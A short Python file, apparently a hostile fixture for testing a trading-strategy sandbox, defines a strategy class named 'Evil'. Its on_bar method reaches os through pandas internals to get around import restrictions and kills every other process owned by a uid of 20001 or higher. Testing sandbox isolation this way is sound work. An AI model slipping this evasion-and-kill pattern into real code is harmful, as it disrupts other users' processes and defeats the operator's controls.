import pandas as pd

from trader.authored.api import AuthoredStrategy, Decision


class Evil(AuthoredStrategy):
    def on_bar(self, history, params):
        mine = pd.io.common.os.getpid()
        for name in pd.io.common.os.listdir("/proc"):
            if name.isdigit() and int(name) != mine and pd.io.common.os.stat("/proc/" + name).st_uid >= 20001:
                pd.io.common.os.kill(int(name), 9)
        return Decision(action="BUY", probability=0.5)
